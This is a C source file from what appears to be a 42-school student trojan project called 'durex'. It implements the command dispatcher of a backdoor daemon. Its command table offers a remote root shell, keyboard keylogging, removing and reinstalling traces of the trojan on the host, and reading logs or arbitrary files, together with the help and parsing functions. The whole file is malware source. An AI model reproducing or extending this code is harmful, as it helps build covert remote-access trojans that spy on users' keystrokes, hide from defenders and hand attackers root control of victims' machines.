/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cmd_parse.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 19:28:36 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

static const t_cmd	g_cmd[] = {
	{"help", &cmd_help, "Prints help"},
	{"shell", &cmd_shell, "Start remote root shell"},
	{"sh", &cmd_shell, NULL},
	{"stop", &cmd_stop, "Terminate all connexions and kill daemon"},
	{"halt", &cmd_stop, NULL},
	{"exit", &cmd_exit, "Exit daemon"},
	{"quit", &cmd_exit, NULL},
	{"remove", &cmd_remove, "Remove all traces of "TROJAN_NAME" from system"},
	{"infect", &cmd_add, "Put back "TROJAN_NAME" into system"},
	{"keylog", &keylog, "Start/stop keylogging activity of keyboard device"},
	{"log", &cmd_print_log, "Print lines of "TROJAN_NAME" log or read file in arg (usage: log [log/kl/kl_parsed/kl_simple || path] [lines 0 - 100])"},
	{"cat", &cmd_print_log, NULL},
	{"read", &cmd_print_log, NULL},
	{NULL, NULL, NULL}
};

int			        cmd_help(t_durex *durex, int co)
{
    char    msg[HELP_SIZE];
    int     i;

    ft_bzero(msg, HELP_SIZE);
    ft_strcat(msg, "Commands:\n\t");
    i = 0;
	while (g_cmd[i].cmd != NULL)
	{
        if (g_cmd[i].desc != NULL)
        {
            ft_strcat(msg, g_cmd[i].cmd);
            ft_strcat(msg, " - ");
            ft_strcat(msg, g_cmd[i].desc);
            ft_strcat(msg, "\n\t");
        }
        ++i;
	}
    ft_strcat(msg, "\n");
	message_client(durex, co, msg);
	return (1);
}

int					cmd_parse(t_durex *durex, int co, char *cmd)
{
	unsigned int		i;
	int					ret;

	i = 0;
	if (!(durex->cmd = ft_strsplit(cmd, ' ')))
	{
		message_client(durex, co, "Malloc error while parsing cmd\n");
		return (-1);
	}
	while (g_cmd[i].cmd != NULL)
	{
		if (ft_strequ(g_cmd[i].cmd, durex->cmd[0]))
		{
			ret = g_cmd[i].fun(durex, co);
			ft_tabfree(&durex->cmd);
			return (ret);
		}
		i++;
	}
	ft_tabfree(&durex->cmd);
	message_client(durex, co, "No such command\n");
	return (-1);
}
